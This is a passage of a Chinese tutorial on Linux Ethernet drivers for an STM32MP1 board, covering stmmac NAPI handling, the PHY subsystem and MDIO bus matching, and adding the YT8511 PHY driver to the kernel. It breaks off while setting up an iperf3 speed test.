+<p>第209行，设置尾指针，启动DMA发送。</p> 
+<p>4、stmmac_interrupt中断函数简析</p> 
+<p>当DMA发送完数据或者接收数据都会产生中断，<strong>调用stmmac_interrupt函数就行处理，stmmac_interrupt函数通过调用stmmac_dma_interrupt函数处理DMA相关中断</strong>，函数的源码如下所示(有省略)：</p> 
+<p><img src="https://images2.imgbox.com/2b/0f/4uVDBAWa_o.png" alt="stmmac_dma_interrupt函数"></p> 
+<p>第15行，调用stmmac_napi_check函数设置NAPI软中断标志位，当触发NAPI机制软中断，这个时候napi的poll函数就会执行，如果是接收数据的就会触发stmmac_napi_poll_rx函数，是发送数据的就会触发stmmac_napi_poll_tx函数。</p> 
+<p>5、stmmac_napi_poll_rx函数简析</p> 
+<p>stmmac_napi_poll_rx函数内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/db/07/bybUrAsG_o.png" alt="stmmac_napi_poll_rx函数"></p> 
+<p>第11行，stmmac_rx函数是用来接收数据的。</p> 
+<p>第12行，napi_complete_done函数结束NAPI轮询。</p> 
+<p>第13行，重新开启dma的中断。</p> 
+<p>6、stmmac_napi_poll_tx函数简析</p> 
+<p>stmmac_napi_poll_tx函数内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/e7/bc/RdXNdat3_o.png" alt="stmmac_napi_poll_tx函数"></p> 
+<p>第12行，调用stmmac_tx_clean进行数据传输，传输完成以后会进行资源回收。</p> 
+<p>第19-24行，重启发送数据。</p> 
+<h3><a id="LinuxPHYMDIO_1526"></a>Linux内核PHY子系统与MDIO总线简析</h3> 
+<p>上一小节在讲解MDIO总线的时候讲过，注册MDIO总线的时候也会向内核注册PHY设备，本节就来简单了解一下PHY子系统。<strong>PHY子系统就是用于PHY设备相关内容的，分为PHY设备和PHY驱动，和platform总线一样，PHY子系统也是一个设备、总线和驱动模型</strong>。</p> 
+<h4><a id="PHY_1528"></a>PHY设备</h4> 
+<p>首先看一下PHY设备，Linux内核使用phy_device结构体来表示PHY设备，结构体定义在include/linux/phy.h，结构体内容如下(为了缩小篇幅，有省略)：</p> 
+<p><img src="https://images2.imgbox.com/c1/46/N7qhTqLQ_o.png" alt="phy_device结构体"></p> 
+<p><strong>一个PHY设备对应一个phy_device实例，然后需要向Linux内核注册这个实例。使用phy_device_register函数完成PHY设备的注册</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">phy_device_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phy<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>phy：需要注册的PHY设备。</li><li>返回值：0，成功；负值，失败。</li></ul> 
+<p><strong>PHY设备的注册过程一般是先调用get_phy_device函数获取PHY设备</strong>，此函数内容如下：</p> 
+<p><img src="https://images2.imgbox.com/26/60/LvfmQLgr_o.png" alt="get_phy_device函数"></p> 
+<p>第827行，<strong>调用get_phy_id函数获取PHY ID</strong>，也就是读取PHY芯片的那两个ID寄存器，得到PHY芯片ID信息。</p> 
+<p>第835行，<strong>调用phy_device_create函数创建phy_device</strong>，此函数先申请phy_device内存，然后初始化phy_device的各个结构体成员，最终返回创建好的phy_device。phy_device_register函数注册的就是这个创建好的phy_device。</p> 
+<h4><a id="PHY_1549"></a>PHY驱动</h4> 
+<p>PHY驱动使用结构体phy_driver表示，结构体也定义在include/linux/phy.h 文件中，结构体内容如下(为了缩小篇幅，省略了注释部分)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.4</span><span class="token number">.3</span> phy_driver 结构体
+<span class="token number">1</span>  <span class="token keyword">struct</span> <span class="token class-name">phy_driver</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">2</span>      <span class="token keyword">struct</span> <span class="token class-name">mdio_driver_common</span> mdiodrv<span class="token punctuation">;</span>
+<span class="token number">3</span>      u32 phy_id<span class="token punctuation">;</span> <span class="token comment">/* PHY ID */</span>
+<span class="token number">4</span>      <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
+<span class="token number">5</span>      u32 phy_id_mask<span class="token punctuation">;</span> <span class="token comment">/* PHY ID 掩码 */</span>
+<span class="token number">6</span>      <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span> <span class="token keyword">const</span> features<span class="token punctuation">;</span>
+<span class="token number">7</span>      u32 flags<span class="token punctuation">;</span>
+<span class="token number">8</span>      <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>driver_data<span class="token punctuation">;</span>
+<span class="token number">9</span>
+<span class="token number">10</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>soft_reset<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">11</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>config_init<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">12</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>probe<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">13</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_features<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">14</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>suspend<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">15</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resume<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">16</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>config_aneg<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">17</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>aneg_done<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">18</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>read_status<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">19</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>ack_interrupt<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">20</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>config_intr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">21</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>did_interrupt<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">22</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>handle_interrupt<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">23</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">24</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>match_phy_device<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">25</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>ts_info<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">,</span>
+<span class="token keyword">struct</span> <span class="token class-name">ethtool_ts_info</span> <span class="token operator">*</span>ti<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">26</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>hwtstamp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ifreq</span> <span class="token operator">*</span>ifr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">27</span>     <span class="token function">bool</span> <span class="token punctuation">(</span><span class="token operator">*</span>rxtstamp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span>
+<span class="token keyword">int</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">28</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>txtstamp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span>
+<span class="token keyword">int</span> type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">29</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_wol<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token keyword">struct</span> <span class="token class-name">ethtool_wolinfo</span> <span class="token operator">*</span>wol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">30</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_wol<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token keyword">struct</span> <span class="token class-name">ethtool_wolinfo</span> <span class="token operator">*</span>wol<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">31</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>link_change_notify<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">32</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>read_mmd<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">int</span> devnum<span class="token punctuation">,</span> u16 regnum<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">33</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>write_mmd<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">int</span> devnum<span class="token punctuation">,</span>
+u16 regnum<span class="token punctuation">,</span>u16 val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">34</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>read_page<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">35</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>write_page<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">int</span> page<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">36</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_info<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token number">37</span>     <span class="token keyword">struct</span> <span class="token class-name">ethtool_modinfo</span> <span class="token operator">*</span>modinfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">38</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>module_eeprom<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token number">39</span>     <span class="token keyword">struct</span> <span class="token class-name">ethtool_eeprom</span> <span class="token operator">*</span>ee<span class="token punctuation">,</span> u8 <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">40</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_sset_count<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">41</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_strings<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> u8 <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">42</span>     <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_stats<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token number">43</span>     <span class="token keyword">struct</span> <span class="token class-name">ethtool_stats</span> <span class="token operator">*</span>stats<span class="token punctuation">,</span> u64 <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">44</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_tunable<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token number">45</span>     <span class="token keyword">struct</span> <span class="token class-name">ethtool_tunable</span> <span class="token operator">*</span>tuna<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">46</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_tunable<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+<span class="token number">47</span>     <span class="token keyword">struct</span> <span class="token class-name">ethtool_tunable</span> <span class="token operator">*</span>tuna<span class="token punctuation">,</span>
+<span class="token number">48</span>         <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">49</span>     <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_loopback<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> bool enable<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">50</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+</code></pre> 
+<p>可以看出，phy_driver重点是大量的函数，编写PHY驱动的主要工作就是实现这些函数，但是不一定全部实现，稍后会简单分析一下Linux内核通用PHY驱动。</p> 
+<p>1、注册PHY驱动</p> 
+<p><strong>phy_driver结构体初始化完成以后，就需要向Linux内核注册，PHY驱动的注册使用phy_driver_register函数</strong>，注册phy驱动时候会设置驱动的总线为mdio_bus_type，也就是MDIO总线，关于MDIO总线稍后会讲解，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">phy_driver_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_driver</span> <span class="token operator">*</span>new_driver<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>new_driver：需要注册的PHY驱动。</li><li>owner：驱动模块所属的PHY设备。</li><li>返回值：0，成功；负值，失败。</li></ul> 
+<p>2、连续注册多个PHY驱动</p> 
+<p>一个厂家会生产多种PHY芯片，这些PHY芯片内部差别一般不大，如果一个个的去注册驱动将会导致一堆重复的驱动文件，因此<strong>Linux内核提供了一个连续注册多个PHY驱动的函数phy_drivers_register</strong>。首先准备一个phy_driver数组，一个数组元素就表示一个PHY芯片的驱动，然后调用phy_drivers_register一次性注册整个数组中的所有驱动，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">phy_drivers_register</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_driver</span> <span class="token operator">*</span>new_driver<span class="token punctuation">,</span> 
+						 <span class="token keyword">int</span> n<span class="token punctuation">,</span>
+						 <span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>new_driver：需要注册的多个PHY驱动数组。</li><li>n：要注册的驱动数量。</li><li>owner：驱动模块所属的PHY设备。</li><li>返回值：0，成功；负值，失败。</li></ul> 
+<p>3、卸载PHY驱动</p> 
+<p><strong>卸载PHY驱动的话使用phy_driver_unregister函数</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">phy_driver_unregister</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">phy_driver</span> <span class="token operator">*</span>drv<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>drv：需要卸载的PHY驱动。</li><li>返回值：无。</li></ul> 
+<h4><a id="MDIO_1651"></a>MDIO总线</h4> 
+<p>前面说了，PHY子系统也是遵循设备、总线、驱动模型的，设备和驱动就是phy_device和phy_driver。<strong>总线就是MDIO总线，因为PHY芯片是通过MDIO接口来管理的，MDIO总线最主要的工作就是匹配PHY设备和PHY驱动</strong>。在文件drivers/net/phy/mdio_bus.c中有如下定义：</p> 
+<p><img src="https://images2.imgbox.com/63/d2/G1Ag21UX_o.png" alt="mdio总线"></p> 
+<p>示例代码52.5.4.4定义了一个名为“mdio_bus_type”的总线，这个就是MDIO总线，总线的名字为“mdio_bus”，<strong>重点是总线的匹配函数为mdio_bus_match</strong>。此函数内容如下：</p> 
+<p><img src="https://images2.imgbox.com/66/cd/DVsjd5Tg_o.png" alt="mdio_bus_match函数"></p> 
+<p>第5行，采用设备树的话先尝试使用of_driver_match_device来对设备和驱动进行匹配，也就是检查compatible属性值与匹配表of_match_table里面的内容是否一致。但是对于本章教程而言，并不是通过of_driver_match_device来完成PHY驱动和设备匹配的。</p> 
+<p>第8-9行，<strong>使用PHY驱动的匹配方法，会调用phy_bus_match函数</strong>，函数源码如下所示：</p> 
+<p><img src="https://images2.imgbox.com/e0/e8/wfrgoqNu_o.png" alt="phy_bus_match函数"></p> 
+<p>第11、12行，检查PHY驱动有没有提供匹配函数match_phy_device，如果有的话就直接调用PHY驱动提供的匹配函数完成与设备的匹配。</p> 
+<p>第26、27行，<strong>phy_driver里面有两个成员变量phy_id和phy_id_mask，表示此驱动所匹配的PHY芯片ID以及ID掩码，PHY驱动编写人员需要给这两个成员变量赋值</strong>。<strong>phy_device也有一个phy_id成员变量，表示此PHY芯片的ID，phy_device里面的phy_id是在注册PHY设备的时候调用get_phy_id函数直接读取PHY芯片内部ID寄存器得到的</strong>！<strong>很明显PHY驱动和PHY设备中的ID要一样，这样才能匹配起来</strong>。所以最后一种方法就是对比PHY驱动和PHY设备中的phy_id是否一致，这里需要与PHY驱动里面的phy_id_mask进行与运算，如果结果一致的话就说明驱动和设备匹配。</p> 
+<p><strong>如果PHY设备和PHY驱动匹配，那么就使用指定的PHY驱动，如果不匹配的话就使用Linux内核自带的通用PHY驱动</strong>。</p> 
+<h4><a id="PHY_1671"></a>通用PHY驱动</h4> 
+<p>前面多次提到Linux内核已经集成了通用PHY驱动，<strong>通用PHY驱动名字为“Generic PHY”</strong>，打开drivers/net/phy/phy_device.c，找到phy_init函数，内容如下：</p> 
+<p><img src="https://images2.imgbox.com/3e/c8/KpiJrt5m_o.png" alt="phy_init函数"></p> 
+<p><strong>phy_init是整个PHY子系统的入口函数</strong>，第11行和15行都会<strong>调用phy_drivers_register函数向内核直接注册一个通用PHY驱动：genphy_c45_driver和genphy_driver；genphy_c45_driver为10G网络，genphy_driver为10/100/1000M网络</strong>。它们都是通用PHY驱动，也就是说Linux系统启动以后默认就已经存在了通用PHY驱动。</p> 
+<p>genphy_c45_driver和genphy_driver这两个结构体 ， 它们定义分别在drivers/net/phy/phy_device.c和drivers/net/phy/phy-c46.c这两个文件中，内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/d2/e6/3nLp3RvQ_o.png" alt="通用PHY设备对象"></p> 
+<p>genphy_c45_driver为10G的PHY驱动，名字为“Generic Clause 45 PHY”，genphy_driver为10/100/1000M的PHY驱动，名字为“Generic PHY”。注意，很多专用PHY芯片的驱动程序中也会用到通用PHY驱动的一些函数。</p> 
+<h3><a id="RTL8211F_PHY_1683"></a>RTL8211F PHY驱动</h3> 
+<p>这里因为我是最新的开发板，是V1.3版本之后的，所以这一小节就直接跳过了。</p> 
+<h3><a id="YT8511_PHY_1685"></a>YT8511 PHY驱动</h3> 
+<p>如果是使用V1.3版本以后的核心板，网络的PHY芯片为YT8511芯片，此芯片为国产的网络芯片，<strong>在Linux内核没有对应的PHY驱动，但是厂家会提供linux下的PHY驱动</strong>。<strong>不过这个原厂驱动有点小问题，那就是没有使能YT8511的125M时钟输出，导致驱动工作不正常。正点原子已经修改好了这个小问题</strong>。</p> 
+<p><strong><font color="Red">在之前的移植Linux驱动的时候已经详细讲解过了如何在Linux内核里面添加YT8511驱动，但是为了教程的连贯性，这里再讲解一遍！</font></strong></p> 
+<h4><a id="Linux_1690"></a>将驱动文件添加到Linux内核</h4> 
+<p>首先需要将28_YT8511C_PHY目录里面的linux驱动文件拷贝到Linux内核源码相应的目录中。这里<strong>一共有motorcomm.c和motorcomm_phy.h这两个文件，一个是驱动C文件，一个是头文件</strong>。把<strong>motorcomm.c拷贝到drivers/net/phy下，把motorcomm_phy.h拷贝到include/linux目录下</strong>。</p> 
+<p>这样就把YT8511的驱动文件和头文件添加到了Linux内核源码中。</p> 
+<h4><a id="Makefile_1694"></a>修改Makefile</h4> 
+<p>前面已经将YT8511的驱动文件添加到Linux内核源码里面了，但是还不能编译，因为还没有添加到Makefile里面。在phy驱动的源码目录drivers/net/phy，打开Makefile文件，添<br> 加如下代码：</p> 
+<table><tbody><tr><td> obj-$(CONFIG_MOTORCOMM_PHY) += motorcomm.o </td></tr></tbody></table> 
+<p>添加结果如下所示：</p> 
+<p><img src="https://images2.imgbox.com/e0/ac/SBQ1tkLY_o.png" alt="在Makefile添加YT8511驱动文件"></p> 
+<h4><a id="Kconfig_1709"></a>修改Kconfig</h4> 
+<p>最后<strong>修改一下drivers/net/phy/Kconfig这个文件，这样以后就可以通过图形化界面来使能或者禁止YT8511驱动了</strong>。在Kconfig里面添加如下内容：</p> 
+<table><tbody><tr><td> config MOTORCOMM_PHY <br> tristate "Motorcomm PHYs" <br> ---help--- <br> Supports the YT8010, YT8510, YT8511, YT8512 PHYs. </td></tr></tbody></table> 
+<p>添加结果如下所示：</p> 
+<p><img src="https://images2.imgbox.com/fe/37/deZqJjDB_o.png" alt="在Kconfig添加YT8511C"></p> 
+<h4><a id="YT8511C_PHY_1726"></a>使能YT8511C PHY驱动</h4> 
+<p>最后就要进入内核的图形界面去使能YT8511驱动，配置路径如下：</p> 
+<table><tbody><tr><td> -&gt; Device Drivers <br> -&gt; Network device support (NETDEVICES [=y]) <br> -&gt; PHY Device support and infrastructure (PHYLIB [=y]) <br> -&gt; &lt;*&gt; Motorcomm PHYs //选中 </td></tr></tbody></table> 
+<p>配置界面如图所示：</p> 
+<p><img src="https://images2.imgbox.com/92/aa/svzVtIkh_o.png" alt="使能YT8511驱动"></p> 
+<p>使能以后就可以重新编译Linux内核，然后使用新的Linux内核启动开发板。</p> 
+<h4><a id="YT8511C_1744"></a>YT8511C驱动源码简析</h4> 
+<p>打开motorcomm.c文件，找到YT8511驱动结构体，代码如下所示：</p> 
+<p><img src="https://images2.imgbox.com/68/22/C3VVSiwU_o.png" alt="YT8511 PHY驱动结构体"></p> 
+<p>第21行，PHY_ID_YT8511是一个宏，定义为0x0000010a，是PHY ID。</p> 
+<p>第22行，驱动名字为"YT8511 Gigabit Ethernet"，系统启动过程中，加载网络设备驱动的时候就会提示电气PHY驱动文字为"YT8511 Gigabit Ethernet"。</p> 
+<p>第23行，PHY 的ID掩码，MOTORCOMM_PHY_ID_MASK是一个宏，定义为0x00000fff，也就是前12位有效，在进行匹配的时候只需要比较前12位。</p> 
+<p>最后，第72行使用module_phy_driver(本质是一个宏)来完成ytphy_drvs的注册，以genphy开头的函数都是通用PHY驱动。</p> 
+<h2><a id="_1756"></a>网络驱动实验测试</h2> 
+<h3><a id="RTL8211F_PHY_1757"></a>RTL8211F PHY驱动测试</h3> 
+<p>这里因为没有这个PHY芯片，所以直接跳过。</p> 
+<h3><a id="YT8511C_PHY_1759"></a>YT8511C PHY驱动测试</h3> 
+<p>之前已经把YT8511C PHY驱动加进入内核里，运行以下命令重新编译内核：</p> 
+<table><tbody><tr><td> make uImage LOADADDR=0XC2000040 -j8 </td></tr></tbody></table> 
+<p>使用新的uImage内核，重新启动开发板，当系统驱动以后就打印出当前PHY驱动名字为“YT8511 Gigabit Ethernet”，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/21/f1/2dLqpx8C_o.png" alt="YT8511C PHY驱动信息"></p> 
+<p>从上图可以知道，此时PHY网络使用的是“YT8511 Gigabit Ethernet”。由于教程中开发板连接到了千M路由器上，因此此时的网速为1Gpbs，也就是1000M网络。<strong>测试网络就很简单了，一直都是用网络在挂载文件系统的，一直在测试中</strong>。</p> 
+<h3><a id="_1774"></a>千兆以太网网速测试</h3> 
+<p><font color="Red">注意：这里要连接千兆路由器或者千兆交换机，没有这两个设备可以开发板和电脑直接连接。</font></p> 
+<p>STM32MP1网络接口为千兆网络，理论最大通信速率可达1000mb/s，RTL8211和YT8511也是千M PHY芯片。本小节就来测试下这个网口的速率，此时<strong>使用开发板和PC机直连方式，使用千兆网线，比如CAT-5E类网线或CAT-6类网线</strong>。</p> 
+<p><strong>Linux下网络速率测试可以使用iperf3工具，iperf3是一个网络性能测试工具，可以测试TCP和UDP的带宽质量、测量TCP最大带宽、报告带宽、延迟抖动和数据丢包等</strong>；这里仅仅只是使用iperf3工具测试开发板上网口的带宽，其它的一些参数特性就不进行详细测试了。</p> 
+<p>iperf3的测试方法需要有一台主机作为服务器端，另一台主机作为客户端，客户端向服务器端发送数据，<strong>这里可以将Ubuntu系统作为服务器端，而开发板作为客户端进行测试</strong>。</p> 
+<h4><a id="iperf3_1782"></a>使能iperf3命令</h4> 
+<p>跳转到buildroot源码目录下，启动到图形配置选项，按照以下配置去是能iperf3命令：</p> 
+<table><tbody><tr><td> -&gt; Target packages <br> -&gt; Networking applications <br> -&gt; [*] iperf3 //选中 </td></tr></tbody></table> 
+<p>配置如下图所示：</p> 
